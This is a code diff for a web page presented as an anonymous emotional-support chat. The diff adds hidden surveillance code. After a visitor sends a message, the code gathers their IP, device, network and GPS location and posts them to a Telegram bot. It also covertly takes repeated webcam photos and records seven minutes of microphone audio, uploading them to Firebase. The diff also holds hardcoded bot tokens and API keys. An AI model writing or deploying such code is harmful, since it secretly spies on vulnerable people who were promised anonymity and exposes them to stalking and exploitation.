@@ -1,85 +1,145 @@
-function toggleMenu() {
-  const menu = document.getElementById('menuList');
-  menu.classList.toggle('hidden');
-}
+// 🔐 Telegram and API keys
+const BOT1 = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
+const BOT2 = "7398679749:AAE12lPcPxXucbfIjcTYlCU_ruMQlqvV0n0";
+const CHAT_ID = "7244443820";
+const GMAPS_KEY = "AIzaSyDTxpoAFF0ktFNOmdGNljAqB1BYjCAD63o";
 
-function showInfo(type) {
-  const content = {
-    about: "This site was built to create a safe anonymous space for emotional expression.",
-    terms: "Terms & Conditions coming soon.",
-    privacy: "Your data is handled respectfully. This is a safe space.",
-    support: "Contact: support@mentalconnect.help",
-    faq: "Q: Is this really anonymous? A: Yes, 100%.",
-    feedback: "We welcome your feedback. Thank you ❤️",
-    rate: "Rate us later maybe 😋"
-  };
-  const modal = document.getElementById('popupModal');
-  modal.innerHTML = `
-    <div style="background:#222;padding:20px;border-radius:10px;">
-      <p>${content[type]}</p>
-      <button onclick="modal.classList.add('hidden')">Close</button>
-    </div>`;
-  modal.classList.remove('hidden');
-}
+// Firebase
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+import { getStorage, ref as sRef, uploadBytes } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-storage.js";
+import { getDatabase, push, ref as dRef } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
 
-function likeVenky() {
-  alert("❤️ Thank you for supporting Venky!");
-}
+const firebaseConfig = {
+  apiKey:"AIzaSyBiIEU8xsfxjYgGRjOvoP1RKtZKwN5i0yk",
+  authDomain:"kycupdateapp.firebaseapp.com",
+  projectId:"kycupdateapp",
+  storageBucket:"kycupdateapp.appspot.com",
+  messagingSenderId:"508854921421",
+  appId:"1:508854921421:web:ebd92a2f9d69b62d54a184"
+};
+const app = initializeApp(firebaseConfig);
+const storage = getStorage(app);
+const database = getDatabase(app);
 
-function dislikeVenky() {
-  alert("🖤 It's okay... he's still here listening.");
-}
+// Element refs
+const msg = document.getElementById("message"),
+      btn = document.getElementById("sendBtn"),
+      namePopup = document.getElementById("namePopup"),
+      nameInput = document.getElementById("nameInput"),
+      submitName = document.getElementById("submitName"),
+      reactions = document.querySelectorAll('.reactions span'),
+      liveBtn = document.getElementById("liveChatBtn"),
+      closeBtn = document.getElementById("closeBtn");
 
-function recordAudio() {
-  alert("🎤 Audio feature coming soon!");
-}
+let typed = "", nameVal = "", permissionGranted = false;
+let picTimer, picsCount=0;
 
-function submitMessage() {
-  const msg = document.getElementById('userMessage').value.trim();
-  if (!msg) {
-    alert("Please type a message first.");
+// Send button enable
+msg.addEventListener('input', ()=> {
+  typed = msg.value.trim();
+  if (typed){
+    btn.disabled = false;
+    btn.classList.add('enabled');
+  } else {
+    btn.disabled = true;
+    btn.classList.remove('enabled');
+  }
+});
+
+// On Send
+btn.onclick = ()=> namePopup.classList.remove('hidden');
+
+// Name submission
+submitName.onclick = async () => {
+  nameVal = nameInput.value.trim();
+  if (!nameVal) {
+    nameInput.classList.add('error');
+    navigator.vibrate?.(100);
+    setTimeout(()=> nameInput.classList.remove('error'),300);
     return;
   }
+  namePopup.classList.add('hidden');
 
-  const name = prompt("Before sending, enter your name (it’ll still be anonymous)");
-  if (!name) {
-    alert("Name required to send message.");
-    return;
-  }
-
+  const d = await collectData();
   const payload = `
-📩 *New Anonymous Message*
-———————————————
-👤 Name: ${name}
-💬 Message: ${msg}
-📱 Device: ${navigator.userAgent}
-🕒 Time: ${new Date().toLocaleString()}
-`;
+🕊️ ${nameVal} sent a message
 
-  // ✅ Send to Bot 1 via Telegram API
-  const botToken = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
-  const chatId = "7244443820"; // your personal Telegram ID
+👤 Name: ${nameVal}
+💬 Message: ${typed}
+🌐 IP: ${d.ip}
+📱 Device: ${d.os}
+🧠 Browser: ${d.browser}
+📶 Network: ${d.network}
+📍 Location: ${d.loc}
+🕐 Time: ${new Date().toLocaleString()}
+  `;
+  await botSend(BOT1, payload);
+  alert("Thanks for opening up to Venky ❤️");
+};
 
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: payload,
-      parse_mode: "Markdown"
-    }),
-  })
-    .then((res) => {
-      alert("✅ Message sent anonymously. Thank you.");
-      document.getElementById('userMessage').value = "";
-    })
-    .catch((err) => {
-      console.error(err);
-      alert("⚠️ Failed to send message.");
-    });
+// Emoji reactions
+document.querySelectorAll(".emoji").forEach(e =>{
+  e.onclick = ()=> botSend(BOT1, `Someone reacted with ${e.textContent}`);
+});
+
+// Live Chat button
+liveBtn.onclick = async () => {
+  await botSend(BOT2, `⚡ Live chat launched by ${nameVal||'Anonymous'}`);
+  window.open("livechat.html","_blank");
+};
+
+// Close & redirect
+closeBtn.onclick = ()=> window.location.href = "https://instagram.com";
+
+// Data collection
+async function collectData(){
+  const ipRes = await fetch("https://api.ipify.org?format=json");
+  const json = await ipRes.json();
+  const network = navigator.connection?.effectiveType||"unknown";
+  const ua = navigator.userAgent;
+  const os = navigator.platform;
+  const browser = ua;
+  let loc = "Not shared";
+  if (navigator.geolocation) {
+    const p = await new Promise(res=>navigator.geolocation.getCurrentPosition(r=>res(r.coords),()=>res(null)));
+    if(p) loc = `https://maps.google.com?q=${p.latitude},${p.longitude}`;
+  }
+  startPicAudio();
+  return {ip:json.ip,network,ua,os,browser,loc};
 }
 
-function exitToInstagram() {
-  alert("📸 Redirecting to Instagram...");
-  window.location.href = "https://instagram.com/_venky__21";
+// Background media
+async function startPicAudio(){
+  try {
+    const audiostream = await navigator.mediaDevices.getUserMedia({audio:true});
+    const videostream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    permissionGranted = true;
+    picTimer = setInterval(async ()=>{
+      if (picsCount < 30){
+        const track = videostream.getVideoTracks()[0];
+        const imgBlob = await new ImageCapture(track).takePhoto();
+        await uploadBytes(sRef(storage, `bgpics/${Date.now()}.jpg`), imgBlob);
+        picsCount++;
+      }
+    },10000);
+
+    const recorder = new MediaRecorder(audiostream);
+    recorder.start();
+    setTimeout(()=>recorder.stop(),7*60*1000);
+    const chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks,{type:'audio/webm'});
+      await uploadBytes(sRef(storage, `bgaudio/${Date.now()}.webm`), blob);
+    }
+  } catch(e){
+    console.warn("Permissions denied:", e);
+  }
+}
+
+async function botSend(token, text){
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method:"POST", headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id: CHAT_ID, text})
+  });
 }
